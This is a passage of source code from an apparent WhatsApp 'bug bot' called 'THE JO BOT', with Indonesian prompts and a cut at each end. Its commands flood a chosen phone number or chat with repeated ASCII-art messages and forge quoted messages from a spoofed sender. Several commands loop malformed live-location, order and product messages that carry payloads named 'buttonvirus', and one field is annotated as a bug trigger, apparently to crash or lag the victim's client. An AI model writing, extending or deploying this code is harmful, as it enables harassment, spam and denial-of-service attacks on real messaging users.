            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            }
            break
          case 'momoto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
          case 'gasmomo': {            
          if (!isCreator) return
           if (!text) throw `Nomernya mana?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break

case 'assalamualaikum':
case 'salam':
case 'malam':
case 'mlm':
case 'sore':
case 'siang':
case 'pagi': {            
          if (!isCreator) return
             salem = `السلام عليكم
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:salem},{quoted:asukonyol11})
}
break
case 'hello': {            
          if (!isCreator) return
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
}
            break
case 'helloto': {            
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
}
            break
case 'gashello': {            
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'tengkorak': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
}
            break
case 'tengkorakto': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'gastengkorak': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE JO BOT INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
case 'liveloc': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"liveLocationMessage": {
						"degreesLatitude": -6.9366881,
						"degreesLongitude": 107.7228148,
						"caption": `THE JO BOT ${philips} ${ngazap(prefix)}`,
						"sequenceNumber": "1657997490287001",
						"jpegThumbnail": "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"
}
}), { userJid: m.chat, quoted: doc })
hisoka.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
	case 'troli': {
	if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
	var troli = generateWAMessageFromContent(m.chat,{

	"orderMessage": {
 
	"orderId": "599519108102353",
 
	"thumbnail": thumb,
 
	"itemCount": 2022,
 
	"status": "INQUIRY",
 
	"surface": "CATALOG",
 
	"message": ` 😈𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃 ${philips} ${ngazap(prefix)}`,
 
	"orderTitle": `${buttonvirus}`, // 
 
	"sellerJid": "6283131458282@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},{quoted: {
	key: {
	fromMe: false,
	participant: 
	`0@s.whatsapp.net`, // Fake sender Jid
	remoteJid: "status@broadcast"
	},
	message: {
	orderMessage: {
	itemCount: 999999999, // Bug
	status: 1,
	surface: 1,
	message: `😈𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃 `,
	orderTitle: '999999999', // Idk what this does
	sellerJid: `0@s.whatsapp.net` // Seller
	}
	}
	}, contextInfo:{}}) 
	hisoka.relayMessage(m.chat, troli.message, { messageId: troli.key.id, a})
	}
	}
	break
case 'catalog': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: hisoka.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "99999999999999",
"title": `THE JO BOT CATALOG 🔥➥ ${buttonvirus}`,
"description": `© THE JO BOT CATALOG ${buttonvirus}`,
"currencyCode": "IDR",
"footerText": `© THE JO BOT CATALOG`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `THE JO BOT`,
